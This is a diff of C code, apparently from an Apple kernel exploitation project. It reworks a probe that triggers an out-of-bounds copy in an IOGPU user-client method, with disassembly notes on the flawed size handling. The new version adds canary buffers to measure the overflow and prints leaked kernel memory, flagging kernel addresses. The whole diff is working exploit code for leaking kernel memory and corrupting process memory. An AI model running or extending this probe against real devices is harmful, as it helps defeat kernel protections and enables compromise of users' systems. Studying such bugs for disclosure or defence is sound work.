@@ -716,29 +716,33 @@ void nk_iogpu_group_oob_run(int trigger)
 
 
     if (trigger == 7) {
-        /* KERNEL READ-OUT PROBE (cmd 0/128) - fixed argument format.
+        /* KERNEL READ-OUT PROBE, definitive form.
          *
-         * The handler (0x9f60050) checks the argument word at struct[24]:
-         *   0x9f600c8: cmp  x3, #16
-         *   0x9f600cc: b.hs 0x9f60198      ; x3 >= 16 -> refusal
-         * so struct[24] is a small TOKEN (0..15), not a pointer - the
-         * earlier version put a real address there and every call was
-         * rejected with kIOReturnNoResources. The helper 0xa241cbc is just
-         * align_up(x, 4) applied to that token.
+         * The argument format is now known and confirmed on device:
+         *   struct[24] = a small TOKEN (0..15); only 0 is accepted.
+         *   struct[56] = a user pointer, struct[64] = id, struct[72] != 0.
+         * The call answers kIOReturnSuccess for token 0.
          *
-         * Then the object is looked up by that token and its data is
-         * copied out:
+         * Where the data lands: the copy-out is
          *   0x9f602f4: ldr  x1, [x20, #56]   ; the kernel object
-         *   0x9f602f8: ldr  x2, [x19, #112]  ; the SIZE (from the kernel)
+         *   0x9f602f8: ldr  x2, [x19, #112]  ; the SIZE, taken from the kernel
+         *   0x9f60310: mov  x3, x21           ; x21 = the INPUT struct
          *   0x9f6031c: bl   0x8474018        ; the copy
-         * The destination is our own memory, so if the kernel-side size is
-         * larger than what we asked for we get extra kernel bytes - a read
-         * - and an overflow past our buffer.
+         * so the bytes are written into our own input struct - and the size
+         * comes from the kernel, not from us. A struct larger than we
+         * supplied means the kernel copied past the end of our buffer:
+         * that is a kernel read (the extra bytes are kernel memory) and an
+         * out-of-bounds write into our process.
+         *
+         * So: the input struct lives at the start of a large buffer whose
+         * tail is filled with a canary, and struct[56] points at a second
+         * large buffer with its own canary. After the call we report the
+         * first changed offset in each - that is the copy size - and print
+         * the changed words, flagging kernel addresses.
          */
-        ol("[grp] === KERNEL READ-OUT PROBE (cmd 0, token format) ===");
+        ol("[grp] === KERNEL READ-OUT PROBE (canary form) ===");
+        static uint8_t pool[0x8000];
         static uint8_t userbuf[0x8000];
-        static uint8_t argsbuf[0x100];
-
         uint64_t grp7 = 0;
         {
             uint8_t o[0x200];
@@ -758,21 +762,19 @@ void nk_iogpu_group_oob_run(int trigger)
         }
         if (!fresh) { ol("[grp] no fresh connection"); return; }
 
-        static const uint64_t tokens[] = { 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 };
-        static const uint64_t ids[] = { 0, 1, 2, 3, 0xffffffff };
-        int hits = 0;
+        static const uint64_t tokens[] = { 0 };
+        static const uint64_t ids[] = { 0, 1, 2, 3, 0xffffffff, 0x10000, 0x100000 };
         for (uint32_t ti = 0; ti < sizeof(tokens)/sizeof(tokens[0]); ti++) {
             for (uint32_t ii = 0; ii < sizeof(ids)/sizeof(ids[0]); ii++) {
                 for (uint32_t f72 = 1; f72 <= 2; f72++) {
-                    memset(userbuf, 0xAA, sizeof(userbuf));
-                    memset(argsbuf, 0, sizeof(argsbuf));
+                    memset(pool, 0xBB, sizeof(pool));
+                    memset(userbuf, 0xCC, sizeof(userbuf));
                     uintptr_t bp7 = (uintptr_t)userbuf;
 
-                    uint8_t in7[STRUCT_SZ];
-                    memset(in7, 0, sizeof(in7));
+                    uint8_t *in7 = pool;              /* the struct at pool+0 */
+                    memset(in7, 0, 0x100);
                     uint64_t c0 = 0;
                     memcpy(in7 + 0, &c0, 8);
-                    /* struct[24] is the TOKEN, not a pointer */
                     uint64_t tok = tokens[ti];
                     memcpy(in7 + 24, &tok, 8);
                     memcpy(in7 + 56, &bp7, 8);
@@ -785,41 +787,48 @@ void nk_iogpu_group_oob_run(int trigger)
                     size_t on7 = sizeof(out7);
                     memset(out7, 0, on7);
                     kern_return_t kr = IOConnectCallStructMethod(fresh, IOGPU_SEL,
-                                                                  in7, sizeof(in7),
-                                                                  out7, &on7);
-                    int touched = 0;
+                                                                  in7, 0x100, out7, &on7);
+                    /* first change in the struct region and past it */
+                    size_t first_struct = (size_t)-1, first_tail = (size_t)-1;
+                    for (size_t o = 0; o < 0x100; o++)
+                        if (pool[o] != 0) { first_struct = o; break; }
+                    for (size_t o = 0x100; o < sizeof(pool); o++)
+                        if (pool[o] != 0xBB) { first_tail = o; break; }
+                    size_t first_user = (size_t)-1;
                     for (size_t o = 0; o < sizeof(userbuf); o++)
-                        if (userbuf[o] != 0xAA) { touched = 1; break; }
-                    if (kr != 0xe00002be || touched) {
-                        ol("[grp] token=%llu id=0x%llx f72=%u -> kr=0x%x touched=%d",
-                           (unsigned long long)tokens[ti], (unsigned long long)ids[ii],
-                           f72, kr, touched);
-                    }
-                    if (touched) {
-                        hits++;
+                        if (userbuf[o] != 0xCC) { first_user = o; break; }
+
+                    ol("[grp] token=%llu id=0x%llx f72=%u -> kr=0x%x outN=%zu "
+                       "struct_first=0x%zx tail_first=0x%zx user_first=0x%zx",
+                       (unsigned long long)tokens[ti], (unsigned long long)ids[ii],
+                       f72, kr, on7, first_struct, first_tail, first_user);
+                    if (first_struct != (size_t)-1 || first_tail != (size_t)-1 ||
+                        first_user != (size_t)-1) {
                         size_t shown = 0;
-                        for (size_t o = 0; o < sizeof(userbuf) && shown < 32; o += 8) {
+                        for (size_t o = 0; o < sizeof(pool) && shown < 40; o += 8) {
+                            uint64_t w = 0;
+                            memcpy(&w, pool + o, 8);
+                            if (w == 0xBBBBBBBBBBBBBBBBULL) continue;
+                            if (o >= 0x100 && first_tail != (size_t)-1 && o > first_tail + 0x40) break;
+                            shown++;
+                            ol("[grp]   pool+0x%04zx = 0x%016llx%s", o,
+                               (unsigned long long)w,
+                               grp_is_kernel_va(w) ? "   <-- KERNEL ADDRESS" : "");
+                        }
+                        for (size_t o = 0; o < sizeof(userbuf) && shown < 60; o += 8) {
                             uint64_t w = 0;
                             memcpy(&w, userbuf + o, 8);
-                            if (w == 0xAAAAAAAAAAAAAAAAULL) continue;
+                            if (w == 0xCCCCCCCCCCCCCCCCULL) continue;
                             shown++;
-                            ol("[grp]   buf+0x%04zx = 0x%016llx%s", o,
+                            ol("[grp]   user+0x%04zx = 0x%016llx%s", o,
                                (unsigned long long)w,
                                grp_is_kernel_va(w) ? "   <-- KERNEL ADDRESS" : "");
                         }
                     }
-                    /* the copy may also land in the output struct */
-                    for (size_t o = 0; o + 8 <= on7 && on7 > 0; o += 8) {
-                        uint64_t w = 0;
-                        memcpy(&w, out7 + o, 8);
-                        if (w && grp_is_kernel_va(w))
-                            ol("[grp]   OUT+0x%03zx = 0x%016llx   <-- KERNEL ADDRESS", o,
-                               (unsigned long long)w);
-                    }
                 }
             }
         }
-        ol("[grp] read-out probe done, buffer hits=%d", hits);
+        ol("[grp] read-out probe done");
         IOServiceClose(fresh);
     }
 
